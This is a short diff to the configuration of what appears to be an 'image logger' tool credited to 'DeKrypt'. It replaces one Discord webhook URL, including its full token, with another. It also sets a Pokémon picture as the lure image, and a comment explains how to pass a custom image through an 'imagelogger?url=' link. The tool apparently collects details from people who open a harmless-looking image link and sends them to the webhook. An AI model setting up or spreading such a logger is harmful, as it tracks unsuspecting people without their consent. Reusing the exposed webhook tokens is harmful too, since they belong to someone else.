@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1396287393019199598/w69h01gApQ8_xFSgekwSKLVdc7Jv_vhqt4Fl-bp7jgHQ-u1Yx0OTdCjUQTecPDQXs3eE",
+    "webhook": "https://discord.com/api/webhooks/1396294931273744554/YfJhOOkBZvzk1w9ydkSVa3HlHEKqaCXgsc66aFlMJSgd3x3g40wzsunj5RsanM3HZp8w",
     "image": "https://www.pokemon.com/static-assets/content-assets/cms2/img/pokedex/full/025.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
